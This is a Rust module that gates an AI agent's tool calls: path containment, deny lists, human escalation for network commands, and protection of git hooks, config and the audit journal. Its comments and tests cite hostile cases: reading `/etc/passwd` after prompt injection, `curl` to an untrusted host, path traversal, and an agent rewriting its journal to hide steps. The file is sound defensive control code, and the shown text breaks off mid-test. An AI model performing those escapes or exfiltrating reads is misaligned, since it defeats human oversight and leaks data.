//! The one place a tool call is checked before it runs.
//!
//! # Why one gate
//!
//! Scattering permission logic across tools is how a project ends up with a policy that is
//! correct in eleven places and wrong in the twelfth. Every call asks this module, and the answer
//! is one of three things: run it, ask a human, or refuse and tell the model why.
//!
//! # Denial is an observation, not a crash
//!
//! A refused call produces a structured message the model can read: what was refused, because of
//! which rule, and what it may do instead. Stopping the run would throw away the attempt over one
//! bad path; an unexplained `denied` would make the model retry the same thing until the loop
//! detector fires. So the observation names the alternatives — the allow patterns, the escalation
//! route — and the run continues.
//!
//! # Escalation is not permission
//!
//! `Effect::External` is never executed by the gate, whatever the config says. The `allow_*`
//! flags do not grant a capability; they mark an escalation as one the daemon may answer itself
//! (`auto_approvable`), for a specific host or a specific kind of action. The distinction matters
//! because a flag that granted permission would be a permission the agent can reach for by
//! editing nothing but its own arguments.
//!
//! # Which rule wins
//!
//! The design says "read is always allowed" and also "leaving `workspace_root` is denied". Those
//! collide for `read_file("/etc/passwd")`. The second wins: it is the rule that exists for
//! prompt-injection and for a looping agent walking the filesystem, and reading outside the root
//! is exactly the exfiltration an injected instruction asks for. Within the root a read needs no
//! permission at all, which is the part of the first rule that carries its weight.
//!
//! # What this gate cannot do
//!
//! It cannot make a path safe between the check and the write. A symlink created inside the
//! worktree after [`PolicyGate::check`] and before the write redirects the write outside it; the
//! gate closes the cases it can see by canonicalising the existing part of the path, and the
//! remaining window is what the per-task worktree and `git` rollback exist for. Say it here
//! rather than imply a guarantee that a synchronous check cannot give.

use std::path::{Component, Path, PathBuf};

use immortality_core::config::Policy;

use crate::Effect;
use crate::classify;
use crate::glob::PatternSet;

/// A path a call will read, write or enter.
///
/// String rather than `PathBuf` because the value came from the model as JSON, and the tool layer
/// has to be able to say "you sent `../etc/passwd`" in the observation rather than a normalised
/// path the model does not recognise.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PathUse {
    pub path: String,
    /// `true` for anything that creates, rewrites or deletes; `false` for a read or a `cd`.
    pub write: bool,
}

impl PathUse {
    #[must_use]
    pub fn read(path: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            write: false,
        }
    }

    #[must_use]
    pub fn write(path: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            write: true,
        }
    }
}

/// The gate's answer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Nothing in the call needs permission.
    Allowed,
    /// A human has to answer before this may run.
    Escalated(Escalation),
    /// Refused; the model gets the observation and continues.
    Denied(Denial),
}

impl Verdict {
    #[must_use]
    pub const fn is_allowed(&self) -> bool {
        matches!(self, Self::Allowed)
    }

    #[must_use]
    pub const fn is_denied(&self) -> bool {
        matches!(self, Self::Denied(_))
    }

    /// The message handed to the model in place of a tool result, if the call did not run.
    #[must_use]
    pub fn observation(&self) -> Option<String> {
        match self {
            Self::Allowed => None,
            Self::Denied(denial) => Some(denial.observation()),
            Self::Escalated(escalation) => Some(escalation.observation()),
        }
    }

    /// A one-line reason for the journal.
    #[must_use]
    pub fn summary(&self) -> String {
        match self {
            Self::Allowed => "allowed".to_string(),
            Self::Denied(denial) => format!("denied: {}", denial.reason),
            Self::Escalated(escalation) => format!("escalated: {}", escalation.reason),
        }
    }
}

/// A refusal, with everything the model needs to try something else.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Denial {
    /// Why, in one clause, for the journal and the escalation list.
    pub reason: String,
    /// The path or command that was refused, as the model wrote it.
    pub subject: String,
    /// What the model may do instead, in the order it should try them.
    pub alternatives: Vec<String>,
    /// The escalation key when the refusal is a "you could ask", empty otherwise.
    pub escalation_key: Option<String>,
}

impl Denial {
    /// A refusal, so that callers outside this module can build one.
    #[must_use]
    pub fn new(reason: impl Into<String>, subject: impl Into<String>) -> Self {
        Self {
            reason: reason.into(),
            subject: subject.into(),
            alternatives: Vec::new(),
            escalation_key: None,
        }
    }

    fn with(mut self, alternative: impl Into<String>) -> Self {
        self.alternatives.push(alternative.into());
        self
    }

    fn asking(mut self, key: impl Into<String>) -> Self {
        self.escalation_key = Some(key.into());
        self
    }

    /// The JSON observation. Deterministic, so it can go into a golden.
    #[must_use]
    pub fn observation(&self) -> String {
        let mut body = serde_json::Map::new();
        body.insert(
            "error".to_string(),
            serde_json::Value::String("denied_by_policy".to_string()),
        );
        body.insert(
            "reason".to_string(),
            serde_json::Value::String(self.reason.clone()),
        );
        body.insert(
            "subject".to_string(),
            serde_json::Value::String(self.subject.clone()),
        );
        body.insert(
            "alternatives".to_string(),
            serde_json::Value::Array(
                self.alternatives
                    .iter()
                    .cloned()
                    .map(serde_json::Value::String)
                    .collect(),
            ),
        );
        if let Some(key) = &self.escalation_key {
            body.insert("escalation".to_string(), serde_json::Value::String(key.clone()));
        }
        body.insert(
            "hint".to_string(),
            serde_json::Value::String(
                "Nothing was executed. Do not retry the same call; choose an alternative above.".to_string(),
            ),
        );
        serde_json::Value::Object(body).to_string()
    }
}

/// A question for the human.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Escalation {
    /// Deduplication key: the same question is never asked twice.
    pub key: String,
    pub reason: String,
    /// Whether the policy flags let the daemon answer this one without waking anybody.
    ///
    /// Not permission — a hint to the escalations queue. The design's rule is that an external
    /// action is never executed automatically, and this field does not change that: what it
    /// changes is whether a queue entry is written as "waiting" or as "auto-approved, recorded".
    pub auto_approvable: bool,
    /// What the model should do while it waits.
    pub continues: String,
}

impl Escalation {
    #[must_use]
    pub fn observation(&self) -> String {
        let body = serde_json::Map::from_iter([
            (
                "error".to_string(),
                serde_json::Value::String("awaiting_human_approval".to_string()),
            ),
            (
                "escalation".to_string(),
                serde_json::Value::String(self.key.clone()),
            ),
            (
                "reason".to_string(),
                serde_json::Value::String(self.reason.clone()),
            ),
            (
                "hint".to_string(),
                serde_json::Value::String(self.continues.clone()),
            ),
        ]);
        serde_json::Value::Object(body).to_string()
    }
}

/// Denied by construction, whatever the config says.
///
/// Separate from the configurable `deny_write_globs` because these are not preferences: a hook
/// written into `.git/hooks` executes on the next commit, and a rewritten global config is how an
/// agent escapes every other rule at once. A config file should not be able to open them.
///
/// The journal is here for the same reason. It is the audit trail recovery reads to answer "what
/// happened before the crash", so an agent that could rewrite it could make a crashed step look
/// like it never ran — and the `prev` chain, which exists to detect exactly that, would be
/// rewritten along with it. `TASKS.json` and `DECISIONS.md` are deliberately *not* here: those are
/// the agent's own working state and the `update_state` tool is how it edits them.
const BUILTIN_DENY_WRITE: &[&str] = &["**/.git/**", "**/.agent/config.toml", "**/.agent/JOURNAL*"];

/// The gate. Construct once per task; the worktree decides where writes may land.
#[derive(Debug, Clone)]
pub struct PolicyGate {
    worktree: PathBuf,
    /// The worktree with symlinks in its existing prefix resolved.
    ///
    /// Kept apart from `worktree` because the two serve different readers: [`Self::worktree`] is
    /// what a human recognises in a message, and this is what containment is decided against. On
    /// macOS they differ for `/tmp`, which is a symlink to `/private/tmp` — comparing a resolved
    /// path against an unresolved root would deny every legitimate write.
    worktree_real: PathBuf,
    workspace_root: PathBuf,
    workspace_root_real: PathBuf,
    allow_write: PatternSet,
    deny_write: PatternSet,
    deny_read: PatternSet,
    /// The project's own `.agent/`, when the caller knows it.
    ///
    /// The plan, the acceptance criteria and the task tree have exactly one home: `<repo>/.agent/`.
    /// The worktree is a *sibling* directory (`<parent>/<name>-agent/<task>`) and holds a checked-out
    /// copy of `.agent/` from whenever the branch was cut. That copy is stale by construction —
    /// measured on the `word-count` fixture: the project said every subtask was `done` while the
    /// worktree still said all of them were `pending`. `read_state` and `update_state` therefore
    /// address this directory, and the gate has to know where it is to allow a path it does not
    /// otherwise reach.
    ///
    /// `None` means "no project root known", which is the honest answer for a gate built by a test
    /// or a caller that only has a worktree. State tools then fall back to the worktree copy, which
    /// is the pre-fix behaviour rather than a new failure mode.
    project_agent_dir: Option<PathBuf>,
    policy: Policy,
}

impl PolicyGate {
    /// Build a gate for one task worktree.
    ///
    /// # Errors
    /// An `allow_write_globs`, `deny_write_globs` or `deny_read_globs` pattern this project's
    /// matcher does not implement. A denied-list typo must be a startup failure: a deny rule that
    /// silently matches nothing is worse than no deny list, because the config claims protection it
    /// does not give.
    pub fn new(
        worktree: impl Into<PathBuf>,
        allow_write_globs: &[String],
        deny_write_globs: &[String],
        policy: Policy,
    ) -> Result<Self, crate::glob::GlobError> {
        // `workspace_root` may contain `~`; config loading expands it, but a gate built from a
        // hand-written default must not treat `~/rust_projects` as a relative path.
        let workspace_root = normalise(&absolute(&expand_tilde(&policy.workspace_root)));
        let worktree = normalise(&absolute(&expand_tilde(&worktree.into())));
        Ok(Self {
            worktree_real: canonical_prefix(&worktree),
            workspace_root_real: canonical_prefix(&workspace_root),
            worktree,
            workspace_root,
            allow_write: PatternSet::parse(allow_write_globs)?,
            deny_write: PatternSet::parse(deny_write_globs)?,
            // Read from the policy rather than a parameter: unlike the write lists, this one has a
            // single source and no caller that needs to override it.
            deny_read: PatternSet::parse(&policy.deny_read_globs)?,
            project_agent_dir: None,
            policy,
        })
    }

    /// The same gate, told where the project's `.agent/` is.
    ///
    /// Set once, by the daemon, from the registered project path. It is not a constructor
    /// parameter because almost every caller has no project root — every tool test builds a gate
    /// from a bare worktree — and a required argument would make those tests invent one.
    #[must_use]
    pub fn with_project_agent_dir(mut self, agent_dir: impl Into<PathBuf>) -> Self {
        self.project_agent_dir = Some(normalise(&absolute(&expand_tilde(&agent_dir.into()))));
        self
    }

    /// The project's `.agent/`, when the caller supplied one.
    #[must_use]
    pub fn project_agent_dir(&self) -> Option<&Path> {
        self.project_agent_dir.as_deref()
    }

    /// A gate with the design's defaults, for tests and for a first run.
    ///
    /// The write lists come from `policy`, not from the constants that used to live here. The
    /// hardcoded pair meant an operator's `deny_write_globs` was parsed, validated, and then
    /// thrown away by the constructor the daemon actually calls — a deny list that reported no
    /// error and enforced nothing.
    ///
    /// # Errors
    /// The policy's patterns are ones this project's matcher does not implement, which is an error
    /// only if the defaults themselves are broken: a test pins that they are not.
    pub fn with_defaults(
        worktree: impl Into<PathBuf>,
        policy: Policy,
    ) -> Result<Self, crate::glob::GlobError> {
        let allow = policy.allow_write_globs.clone();
        let deny = policy.deny_write_globs.clone();
        Self::new(worktree, &allow, &deny, policy)
    }

    /// The worktree writes are confined to.
    #[must_use]
    pub fn worktree(&self) -> &Path {
        &self.worktree
    }

    /// The workspace root reads are confined to.
    #[must_use]
    pub fn workspace_root(&self) -> &Path {
        &self.workspace_root
    }

    /// The policy this gate was built from.
    #[must_use]
    pub const fn policy(&self) -> &Policy {
        &self.policy
    }

    /// Check a call by its declared effect and the paths it touches.
    ///
    /// The tool reports `Effect::External` for anything it cannot classify — a shell command it
    /// did not recognise, a network call — and this function never lets that through unless the
    /// operator turned on `yolo`.
    #[must_use]
    pub fn check(&self, effect: Effect, paths: &[PathUse]) -> Verdict {
        match effect {
            Effect::Read => self.check_reads(paths),
            Effect::Mutate => self.check_writes(paths),
            Effect::External => {
                if self.policy.yolo {
                    // The same split the trusted-host branch makes: the *external* part is what
                    // `yolo` waives, and the paths still are not. Turning an escalation into a
                    // blanket `Allowed` here would let `curl x > /etc/passwd` through, which is a
                    // hole the flag never claimed to open.
                    return self.check_writes(paths);
                }
                Self::escalate("the call was declared external", "external", false)
            }
        }
    }

    /// Check a shell command: classify it, then treat its paths like any other call's.
    ///
    /// Redirections count as writes, `cd` counts as entering a directory, and a recognised
    /// benchmark/build command counts as a mutation. Anything the classifier does not recognise
    /// arrives here as `External` and becomes an escalation.
    #[must_use]
    pub fn check_command(&self, command: &str) -> Verdict {
        let classification = classify::classify(command);
        // The operator's deny list comes first and has no exceptions. It is checked before the
        // trusted-host shortcut and before the effect match, because `trusted_hosts` is about the
        // network and this is about the program: `curl` to a trusted host is still `curl`.
        if let Some(banned) = self.denied_program(&classification.programs) {
            return Verdict::Denied(
                Denial::new(
                    format!("`{banned}` is on the operator's program deny list"),
                    &banned,
                )
                .with("the program is banned in the global config, where the agent cannot reach it")
                .with("use a tool or a program that does the job without it"),
            );
        }
        if classification.effect == Effect::External {
            // A trusted host is the design's one exception: the model backend lives on one, and
            // asking a human to approve every request to it would make `doctor` unusable. Every
            // host the command names must be trusted: `curl trusted evil` is still a request to
            // `evil`, and a rule that needs only *one* familiar word in the line is a rule an
            // injected prompt defeats by prefixing it.
            let hosts = hosts_mentioned(command);
            let all_trusted =
                !hosts.is_empty() && hosts.iter().all(|host| self.policy.trusted_hosts.contains(host));
            if all_trusted {
                // The network part is allowed; the paths still are not.
                return self.check(Effect::Mutate, &classification.paths);
            }
            let network = classification
                .programs
                .iter()
                .any(|program| matches!(program.as_str(), "curl" | "wget" | "ssh" | "scp" | "git"));
            if self.policy.yolo {
                // Same rule as `check`: the external part is waived, the paths are not. A command
                // that writes outside the worktree is still refused with the flag on.
                return self.check(Effect::Mutate, &classification.paths);
            }
            return Self::escalate(
                &classification.reason,
                &format!("command:{}", first_word(command)),
                network && self.policy.allow_network,
            );
        }
        self.check(classification.effect, &classification.paths)
    }

    /// Whether a path is one the policy forbids writing, regardless of the allow list.
    #[must_use]
    pub fn is_denied_write(&self, relative: &str) -> Option<String> {
        if let Some(glob) = self.deny_write.matching(relative) {
            return Some(format!("matched `{glob}`"));
        }
        if let Ok(builtin) = PatternSet::parse(BUILTIN_DENY_WRITE)
            && let Some(glob) = builtin.matching(relative)
        {
            return Some(format!("matched the built-in rule `{glob}`"));
        }
        None
    }

    /// The first program in `programs` that the operator banned.
    ///
    /// A linear scan over a list a human wrote, so `Vec` is the right container: a `BTreeSet` would
    /// make the config harder to write for a lookup nobody measures.
    #[must_use]
    pub fn denied_program(&self, programs: &[String]) -> Option<String> {
        programs
            .iter()
            .find(|program| self.policy.deny_programs.iter().any(|banned| banned == *program))
            .cloned()
    }

    fn check_reads(&self, paths: &[PathUse]) -> Verdict {
        for used in paths {
            let Some(resolved) = self.resolve(&used.path) else {
                return Verdict::Denied(Self::denial_for_unresolvable(used));
            };
            if !resolved.starts_with(&self.workspace_root_real) {
                return Verdict::Denied(
                    Denial::new("the path is outside the workspace root", &used.path)
                        .with(format!("stay under `{}`", self.workspace_root.display()))
                        .with("if the file is genuinely needed, ask with the `escalate` tool"),
                );
            }
            if let Some(why) = self.is_denied_read(&resolved) {
                return Verdict::Denied(
                    Denial::new(format!("the path is on the read deny list ({why})"), &used.path)
                        .with("the file is excluded by the operator, not by the worktree")
                        .with("ask a human if the content is genuinely required"),
                );
            }
            // A read that lands in a write position is still a write; callers declare it.
            if used.write {
                return self.check_writes(std::slice::from_ref(used));
            }
        }
        Verdict::Allowed
    }

    /// Whether a path is one the operator forbade reading.
    ///
    /// Matched relative to [`Self::workspace_root`] rather than the worktree: reads are confined to
    /// the root, so that is the frame in which a deny glob means something. The worktree is
    /// excluded deliberately — a pattern written for "everything under my projects directory" would
    /// otherwise match nothing, because an agent's reads are always worktree-relative while its
    /// dangerous reads (`~/.ssh`, `~/.aws`) never are.
    fn is_denied_read(&self, resolved: &Path) -> Option<String> {
        let relative = resolved.strip_prefix(&self.workspace_root_real).ok()?;
        let mut out = String::new();
        for component in relative.components() {
            if let Component::Normal(part) = component {
                if !out.is_empty() {
                    out.push('/');
                }
                out.push_str(&part.to_string_lossy());
            }
        }
        self.deny_read
            .matching(&out)
            .map(|glob| format!("matched `{glob}`"))
    }

    fn check_writes(&self, paths: &[PathUse]) -> Verdict {
        if paths.is_empty() {
            // A mutating tool that names no path changes something this gate cannot see — a
            // process, a git ref. That is not a path violation, and the tool's own effect
            // classification plus the process registry are what cover it.
            return Verdict::Allowed;
        }
        for used in paths {
            let Some(resolved) = self.resolve(&used.path) else {
                return Verdict::Denied(Self::denial_for_unresolvable(used));
            };
            let Some(relative) = self.relative(&resolved) else {
                return Verdict::Denied(
                    Denial::new("the path is outside the task worktree", &used.path)
                        .with(format!("write inside `{}` only", self.worktree.display()))
                        .with("check the path for `..` segments"),
                );
            };

            if let Some(verdict) = self.check_one_write(&relative, used) {
                return verdict;
            }
        }
        Verdict::Allowed
    }

    /// Check a write to one of the five state documents in the *project's* `.agent/`.
    ///
    /// Deliberately not part of [`Self::check_writes`]. That function is the gate for every tool,
    /// and teaching it that a path outside the worktree may be written would let `write_file`
    /// rewrite the plan directly — a capability `update_state` exists to make impossible in the
    /// first place. Only the state tools ask this question, and only with a name from the closed
    /// list, so the set of writable paths outside the worktree is five files and nothing else.
    #[must_use]
    pub fn check_state_write(&self, name: &str) -> Verdict {
        if !crate::state::StateFile::is_state_file(name) {
            return Verdict::Denied(
                Denial::new("the file is not one of the five state documents", name)
                    .with("use `update_state`, whose `file` argument is an enum, not a path"),
            );
        }
        let used = PathUse::write(self.state_path(name).display().to_string());
        // The deny list is evaluated against `.agent/<name>`, the same string it would see for a
        // copy inside the worktree, so an operator's pattern keeps its meaning.
        let relative = format!(".agent/{name}");
        self.check_one_write(&relative, &used).unwrap_or(Verdict::Allowed)
    }

    /// Check a read of one of the five state documents in the project's `.agent/`.
    ///
    /// Reads inside `workspace_root` are already allowed, so this is not a permission — it is the
    /// same five-name list as the write side, so that a model naming `JOURNAL.jsonl` gets the
    /// argument error `update_state` would give rather than a journal read dressed as state.
    #[must_use]
    pub fn check_state_read(&self, name: &str) -> Verdict {
        if !crate::state::StateFile::is_state_file(name) {
            return Verdict::Denied(
                Denial::new("the file is not one of the five state documents", name)
                    .with("use `read_state`, whose `file` argument is an enum, not a path"),
            );
        }
        let resolved = self.state_path(name);
        if let Some(why) = self.is_denied_read(&resolved) {
            return Verdict::Denied(
                Denial::new(format!("the path is on the read deny list ({why})"), name)
                    .with("the file is excluded by the operator, not by the worktree"),
            );
        }
        Verdict::Allowed
    }

    /// The absolute path of a state document, in the project's `.agent/` when it is known.
    ///
    /// The fallback is the worktree's copy, which is what every test and every gate built from a
    /// bare worktree gets. It is stale by construction during a real run — the worktree branch was
    /// cut before the plan was edited — which is exactly why the daemon always supplies the project
    /// root through [`Self::with_project_agent_dir`].
    #[must_use]
    pub fn state_path(&self, name: &str) -> PathBuf {
        self.project_agent_dir.as_ref().map_or_else(
            || self.worktree.join(crate::state::AGENT_DIR).join(name),
            |dir| dir.join(name),
        )
    }

    /// The directory holding the state documents, for a caller that needs the whole set.
    #[must_use]
    pub fn state_dir(&self) -> PathBuf {
        self.project_agent_dir
            .clone()
            .unwrap_or_else(|| self.worktree.join(crate::state::AGENT_DIR))
    }

    /// Judge one write against the deny list and the allow list.
    fn check_one_write(&self, relative: &str, used: &PathUse) -> Option<Verdict> {
        if let Some(why) = self.is_denied_write(relative) {
            let mut denial = Denial::new(
                format!("the path is protected by the deny list ({why})"),
                &used.path,
            );
            denial = denial
                .with("choose another file")
                .with("if this is genuinely required, it is a human decision, not a tool call");
            if Self::needs_escalation_for_write(relative) {
                denial = denial.asking(format!("write:{relative}"));
            }
            return Some(Verdict::Denied(denial));
        }

        if !self.allow_write.matches(relative) {
            return Some(Verdict::Denied(
                Denial::new("the path is not covered by the write allow list", &used.path)
                    .with(format!("write inside `{}` only", self.worktree.display()))
                    .with("the allow list is read from the global config, not the project"),
            ));
        }
        None
    }

    /// Neither `.git` nor the project config can be granted by a config flag.
    fn needs_escalation_for_write(relative: &str) -> bool {
        let builtin = PatternSet::parse(BUILTIN_DENY_WRITE).ok();
        builtin.is_some_and(|set| set.matches(relative))
    }

    fn denial_for_unresolvable(used: &PathUse) -> Denial {
        Denial::new(
            "the path could not be resolved without leaving the worktree",
            &used.path,
        )
        .with("use a path relative to the worktree root")
        .with("`..` may not climb above the worktree")
        .with("`~` is not expanded; write paths relative to the repository")
    }

    /// Make `raw` absolute, resolve `.` and `..`, and refuse anything that climbs above the
    /// worktree even if it lands back inside afterwards.
    ///
    /// Public because the tool layer must use *this* answer rather than joining the raw argument
    /// onto the worktree itself. Two resolutions of one argument are one resolution too many:
    /// with a symlink in the path, the gate would judge the canonicalised target while the tool
    /// opened the link, and the check would be decoration.
    #[must_use]
    pub fn resolve(&self, raw: &str) -> Option<PathBuf> {
        if raw.is_empty() {
            return None;
        }
        // `~/x` is a human convenience, not something a tool argument may use: expanding it would
        // silently turn a relative-looking path into a write outside the worktree.
        if raw.starts_with('~') {
            return None;
        }
        let path = Path::new(raw);
        let combined = if path.is_absolute() {
            path.to_path_buf()
        } else {
            self.worktree.join(path)
        };
        let normalised = normalise(&combined);
        // Lexical resolution is not enough when a symlink points outside; canonicalise whatever
        // part of the path exists and re-apply the normalisation to the rest.
        Some(canonical_prefix(&normalised))
    }

    /// The path relative to the worktree, or `None` when it is outside it.
    fn relative(&self, resolved: &Path) -> Option<String> {
        let relative = resolved.strip_prefix(&self.worktree_real).ok()?;
        let mut out = String::new();
        for component in relative.components() {
            if let Component::Normal(part) = component {
                if !out.is_empty() {
                    out.push('/');
                }
                out.push_str(&part.to_string_lossy());
            }
        }
        Some(out)
    }

    fn escalate(reason: &str, subject: &str, auto_approvable: bool) -> Verdict {
        Verdict::Escalated(Escalation {
            key: format!("external:{subject}"),
            reason: reason.to_string(),
            auto_approvable,
            continues: "The call did not run. Continue with work that does not need approval, \
                        and the human's answer will arrive as an observation."
                .to_string(),
        })
    }
}

/// The first word of a command, for an escalation key that a human can read.
fn first_word(command: &str) -> String {
    command.split_whitespace().next().unwrap_or("empty").to_string()
}

/// Every hostname the command mentions.
///
/// Deliberately textual, and deliberately strict about what counts as a host: a token is one only
/// when it carries a scheme (`http://host/...`) or an explicit port (`host:8080`). That excludes
/// file names — `src/main.rs` has neither — while catching the two forms a network command
/// actually takes. Anything it does not recognise yields no host, and no host means not trusted,
/// which is the safe direction.
///
/// A host must be named for a command to inherit trust, so a script whose body is hidden cannot
/// claim it; and *every* host in the line must be trusted, so a familiar name cannot launder an
/// unfamiliar one.
fn hosts_mentioned(command: &str) -> Vec<String> {
    command
        .split(|ch: char| {
            ch.is_whitespace() || matches!(ch, '"' | '\'' | ';' | '|' | '&' | '(' | ')' | '<' | '>' | '`')
        })
        .filter_map(host_of)
        .collect()
}

/// The hostname of one command word, if it names one.
fn host_of(word: &str) -> Option<String> {
    let had_scheme = word.contains("://");
    let rest = match word.split_once("://") {
        Some((_, after)) => after,
        None => word,
    };
    // The path, query and fragment end the authority section.
    let authority = rest.split(['/', '?', '#']).next().unwrap_or(rest);
    if authority.is_empty() {
        return None;
    }
    // `user:password@host` - the host is after the last `@`.
    let authority = authority.rsplit('@').next().unwrap_or(authority);
    let (host, port) = match authority.rsplit_once(':') {
        Some((host, port)) if !port.is_empty() && port.chars().all(|ch| ch.is_ascii_digit()) => {
            (host, Some(port))
        }
        _ => (authority, None),
    };
    if host.is_empty() {
        return None;
    }
    // Without a scheme or a port there is nothing distinguishing `main.rs` from a hostname.
    if !had_scheme && port.is_none() {
        return None;
    }
    if !host
        .chars()
        .all(|ch| ch.is_ascii_alphanumeric() || ch == '-' || ch == '.')
    {
        return None;
    }
    Some(host.to_string())
}

fn expand_tilde(path: &Path) -> PathBuf {
    let text = path.to_string_lossy();
    let Some(rest) = text.strip_prefix('~') else {
        return path.to_path_buf();
    };
    let home = std::env::var_os("HOME").map_or_else(|| PathBuf::from("/"), PathBuf::from);
    let rest = rest.strip_prefix('/').unwrap_or(rest);
    home.join(rest)
}

fn absolute(path: &Path) -> PathBuf {
    if path.is_absolute() {
        return path.to_path_buf();
    }
    std::env::current_dir().map_or_else(|_| path.to_path_buf(), |cwd| cwd.join(path))
}

/// Resolve `.` and `..` without touching the filesystem.
///
/// `..` at the root is kept rather than dropped: dropping it would turn `/etc/../passwd` into
/// `/etc/passwd` (correct) but `worktree/../../x` into `worktree/x` (wrong, and the wrong
/// direction). Keeping it lets the containment check see the escape.
fn normalise(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::Prefix(prefix) => out.push(prefix.as_os_str()),
            Component::RootDir => out.push(Path::new("/")),
            Component::CurDir => {}
            Component::ParentDir => {
                // Pop only a real segment: a `..` at `/` or after another `..` stays, so that a
                // path which climbed above the root is still recognisably outside it.
                if out.file_name().is_some() {
                    out.pop();
                } else {
                    out.push("..");
                }
            }
            Component::Normal(part) => out.push(part),
        }
    }
    out
}

/// Canonicalise the longest existing prefix and append the rest unchanged.
///
/// This is what defeats `symlink -> /etc` inside the worktree: the symlink exists, so the prefix
/// resolves to `/etc` and the containment check sees an outside path.
fn canonical_prefix(path: &Path) -> PathBuf {
    let mut existing = path;
    let mut rest: Vec<&std::ffi::OsStr> = Vec::new();
    loop {
        if let Ok(canonical) = existing.canonicalize() {
            let mut out = canonical;
            for part in rest.iter().rev() {
                out.push(part);
            }
            return normalise(&out);
        }
        let Some(parent) = existing.parent() else {
            return normalise(path);
        };
        if let Some(name) = existing.file_name() {
            rest.push(name);
        }
        existing = parent;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy() -> Policy {
        Policy {
            workspace_root: PathBuf::from("/tmp/ws"),
            ..Policy::default()
        }
    }

    fn gate() -> PolicyGate {
        PolicyGate::with_defaults("/tmp/ws/repo", policy()).expect("valid defaults")
    }

    #[test]
    fn a_read_inside_the_worktree_needs_no_permission() {
        let verdict = gate().check(Effect::Read, &[PathUse::read("src/main.rs")]);
        assert_eq!(verdict, Verdict::Allowed);
    }

    #[test]
    fn a_read_outside_the_workspace_root_is_denied() {
        // The anti-exfiltration rule, which wins over "reads are always allowed".
        let verdict = gate().check(Effect::Read, &[PathUse::read("/etc/passwd")]);
        assert!(verdict.is_denied(), "{verdict:?}");
        let observation = verdict.observation().expect("an observation");
        assert!(observation.contains("workspace root"), "{observation}");
    }

    #[test]
    fn a_read_outside_the_worktree_but_inside_the_root_is_allowed() {
        // A task legitimately reads a sibling project or the shared config.
        let verdict = gate().check(Effect::Read, &[PathUse::read("/tmp/ws/other/file.rs")]);
        assert_eq!(verdict, Verdict::Allowed);
    }

    #[test]
    fn a_write_inside_the_worktree_is_allowed() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write("src/lib.rs")]);
        assert_eq!(verdict, Verdict::Allowed);
    }

    #[test]
    fn a_write_outside_the_worktree_is_denied_even_inside_the_workspace_root() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write("/tmp/ws/other/file.rs")]);
        assert!(verdict.is_denied());
        assert!(verdict.observation().unwrap().contains("worktree"), "{verdict:?}");
    }

    #[test]
    fn parent_segments_cannot_climb_out_of_the_worktree() {
        for path in [
            "../outside.rs",
            "src/../../outside.rs",
            "./../../outside.rs",
            "a/b/../../../outside.rs",
        ] {
            let verdict = gate().check(Effect::Mutate, &[PathUse::write(path)]);
            assert!(verdict.is_denied(), "{path} was allowed: {verdict:?}");
        }
    }

    #[test]
    fn dot_segments_that_stay_inside_are_accepted() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write("src/./lib.rs")]);
        assert_eq!(verdict, Verdict::Allowed);
    }

    #[test]
    fn a_tilde_path_is_refused_rather_than_expanded() {
        // Expanding `~` would silently turn a relative-looking argument into a write in the
        // user's home directory.
        let verdict = gate().check(Effect::Mutate, &[PathUse::write("~/secrets.txt")]);
        assert!(verdict.is_denied());
        assert!(verdict.observation().unwrap().contains('~'));
    }

    #[test]
    fn an_empty_path_is_refused() {
        assert!(gate().check(Effect::Mutate, &[PathUse::write("")]).is_denied());
    }

    #[test]
    fn the_designs_deny_globs_protect_secrets_and_git_config() {
        for path in [".env", ".env.local", ".git/config", "sub/.git/config"] {
            let verdict = gate().check(Effect::Mutate, &[PathUse::write(path)]);
            assert!(verdict.is_denied(), "{path}: {verdict:?}");
            assert!(
                verdict.observation().unwrap().contains("deny list"),
                "{path}: {verdict:?}"
            );
        }
    }

    #[test]
    fn a_git_hook_cannot_be_written_even_though_the_allow_list_covers_it() {
        // Writing `.git/hooks/pre-commit` is arbitrary code execution on the next commit. The
        // allow list says `**`; the built-in deny wins.
        let verdict = gate().check(Effect::Mutate, &[PathUse::write(".git/hooks/pre-commit")]);
        assert!(verdict.is_denied(), "{verdict:?}");
        assert!(verdict.observation().unwrap().contains("built-in"));
    }

    #[test]
    fn the_project_config_cannot_be_rewritten() {
        let verdict = gate().check(Effect::Mutate, &[PathUse::write(".agent/config.toml")]);
        assert!(verdict.is_denied(), "{verdict:?}");
    }

    #[test]
    fn the_journal_cannot_be_rewritten_or_rotated_away() {
        // The journal is the audit trail recovery trusts. An agent that could rewrite it could
        // hide a crashed step, and the `prev` chain that exists to detect exactly that would be
        // rewritten too. Both the live segment and a rotated one are covered.
        for path in [
            ".agent/JOURNAL.jsonl",
            ".agent/JOURNAL.2026-11-12T10-00-00.jsonl",
            "sub/.agent/JOURNAL.jsonl",
        ] {
            let verdict = gate().check(Effect::Mutate, &[PathUse::write(path)]);
            assert!(verdict.is_denied(), "{path}: {verdict:?}");
            assert!(
                verdict.observation().unwrap().contains("built-in"),
                "{path}: {verdict:?}"
            );
        }
    }

    #[test]
    fn the_agents_own_state_files_stay_writable() {
        // The deny list above must not take `update_state` with it: those files are the agent's
        // working memory, not the audit trail.
        for path in [".agent/TASKS.json", ".agent/DECISIONS.md", ".agent/NOTES.md"] {
            assert_eq!(
                gate().check(Effect::Mutate, &[PathUse::write(path)]),
                Verdict::Allowed,
                "{path}"
            );
        }
    }

    #[test]
    fn a_narrow_allow_list_is_honoured() {
        let gate = PolicyGate::new(
            "/tmp/ws/repo",
            &["src/**".to_string()],
            &[] as &[String],
            policy(),
        )
        .unwrap();
        assert_eq!(
            gate.check(Effect::Mutate, &[PathUse::write("src/a.rs")]),
            Verdict::Allowed
        );
        let verdict = gate.check(Effect::Mutate, &[PathUse::write("README.md")]);
        assert!(verdict.is_denied(), "{verdict:?}");
        assert!(
            verdict.observation().unwrap().contains("allow list"),
            "{verdict:?}"
        );
    }

    #[test]
    fn a_malformed_deny_glob_fails_at_construction() {
